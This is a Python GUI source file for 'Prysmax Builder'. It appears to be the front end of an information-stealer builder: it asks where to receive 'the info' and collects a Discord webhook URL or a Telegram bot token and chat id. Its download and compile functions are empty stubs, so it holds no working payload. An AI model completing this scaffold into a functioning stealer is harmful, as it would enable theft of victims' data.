from tkinter import messagebox
from customtkinter import *


def startup_():
	def start():
		window.destroy()
		witch1()
	#window
	window= CTk()
	window.title("Prysmax Builder")
	window.resizable(0,0)
	window.configure(fg_color="black")
	window.geometry("400x300+500+200")
	#labels and buttons
	title_=CTkLabel(window,text="Welcome to\nPrysmax Builder",text_color="purple",font=("bold",30))
	button=CTkButton(window,text="start",text_color="white",fg_color="purple",hover_color="snow",command=start,corner_radius=30)
	info=CTkLabel(window,text="version 0.1",text_color="purple",font=("bold",12))
	#packs and palces
	title_.pack(pady=50)
	button.pack(side="bottom",pady=50)
	info.place(x=10,y=270)
	window.mainloop()
def witch1():
	def go_back():
		window2.destroy()
		witch1()
		pass
	def disc0rd_():
		def Download_():
			pass 
		def compile_():
			pass
		def discord_webhook():
			url=Discord_webhook_entry.get()
			#create your file replace webook function etc.
			pass
		#configs
		window2.geometry("640x230")
		title_.configure(text="Discord") #logo
		disc0rd.configure(text="Download Libraries",command=Download_) #Download
		Tele6ram.configure(text="Compile and Explore",command=compile_) #compile and explore 
		B0th.configure(text="back",width=5,corner_radius=20,command=go_back) #go_back
		Exit0.configure(width=20)
		Tele6ram.place(x=165,y=100)
		disc0rd.place(x=20,y=100)
		B0th.place(x=320,y=100)
		title_.place(y=20,x=50)
		Exit0.place(x=300,y=20)
		#entry
		Discord_webhook_entry=CTkEntry(F,placeholder_text="Enter your discord webhook url",fg_color="black"
		,border_width=2,border_color="purple",corner_radius=10,width=370,text_color="purple")
		Discord_webhook_entry.place(x=20,y=60)
		
	def Tele6ram_():
		def Download_2():
			pass 
		def compile_2():
			pass
		#configs
		window2.geometry("640x230")
		title_.configure(text="Telegram") #logo
		disc0rd.configure(text="Download Libraries",command=Download_2) #Download
		Tele6ram.configure(text="Compile and Explore",command=compile_2) #compile and explore 
		B0th.configure(text="back",width=5,corner_radius=20,command=go_back) #go_back
		Exit0.configure(width=20)
		Tele6ram.place(x=165,y=150)
		disc0rd.place(x=20,y=150)
		B0th.place(x=320,y=150)
		title_.place(y=20,x=50)
		Exit0.place(x=300,y=20)
		#entry
		Telegram_bot_token=CTkEntry(F,placeholder_text="Enter your telegram bot token",fg_color="black"
		,border_width=2,border_color="purple",corner_radius=10,width=370,text_color="purple")
		
		Telegram_chat_id=CTkEntry(F,placeholder_text="Enter your telegram chat id",fg_color="black"
		,border_width=2,border_color="purple",corner_radius=10,width=370,text_color="purple")
		
		Telegram_chat_id.place(x=20,y=100)
		Telegram_bot_token.place(x=20,y=60)

	def B0th_():
		F.pack(side='left',fill='both')
		F.configure(width=440)
		window2.geometry("640x300")
		
		Discord_webhook_entry=CTkEntry(F,placeholder_text="Enter your discord webhook url",fg_color="black"
		,border_width=2,border_color="purple",corner_radius=10,width=370,text_color="purple")
		
		Telegram_bot_token=CTkEntry(F,placeholder_text="Enter your telegram bot token",fg_color="black"
		,border_width=2,border_color="purple",corner_radius=10,width=370,text_color="purple")

		Telegram_chat_id=CTkEntry(F,placeholder_text="Enter your telegram chat id",fg_color="black"
		,border_width=2,border_color="purple",corner_radius=10,width=370,text_color="purple")
		
		Discord_webhook_entry.place(x=20,y=140)
		Telegram_chat_id.place(x=20,y=100)
		Telegram_bot_token.place(x=20,y=60)

		title_.configure(text="Telegram and Discord") #logo
		disc0rd.configure(text="Download Libraries") #Download
		Tele6ram.configure(text="Compile and Explore") #compile and explore 
		B0th.configure(text="back",width=5,corner_radius=20,command=go_back) #go_back
		Exit0.configure(width=20)
		Tele6ram.place(x=165,y=200)
		disc0rd.place(x=20,y=200)
		B0th.place(x=320,y=200)
		title_.place(y=20,x=70)
		Exit0.place(x=300,y=20)
		pass
	def Exit():
		message = messagebox.askquestion(title="pysmax builder",message="are you sure you want to exit?")
		if message=="yes":
			exit()
		else:
			pass
		
	#window
	window2= CTk()
	window2.title("Prysmax Builder")
	window2.resizable(0,0)
	window2.configure(fg_color="black")
	window2.geometry("640x200+400+250")
	#logo
	logo=CTkLabel(window2,text="Pysmax Builder",text_color="purple",font=("",25))
	#frames
	F =CTkFrame(window2,fg_color="black",border_color="purple",border_width=2,corner_radius=30,bg_color="black")
	#labels
	title_=CTkLabel(F,text="Where to recive the info?",text_color="purple",font=("bold",20))
	#buttons
	Tele6ram=CTkButton(F,text="Telegram",command=Tele6ram_,text_color="white",fg_color="purple",hover_color="snow",corner_radius=30)
	disc0rd=CTkButton(F,text="Discord",command=disc0rd_,text_color="white",fg_color="purple",hover_color="snow",corner_radius=30)
	B0th=CTkButton(F,text="Both",command=B0th_,text_color="white",fg_color="purple",hover_color="snow",corner_radius=30)
	Exit0=CTkButton(F,text="Exit",command=Exit,text_color="white",fg_color="purple",hover_color="red",corner_radius=30)
	#packs and places
	logo.pack(side="left",padx=20)
	F.pack(side="bottom",fill="both",pady=20)
	title_.place(y=20,x=80)
	Tele6ram.place(x=40,y=60)
	disc0rd.place(x=40,y=100)
	B0th.place(x=220,y=60)
	Exit0.place(x=220,y=100)
	window2.mainloop()

startup_()
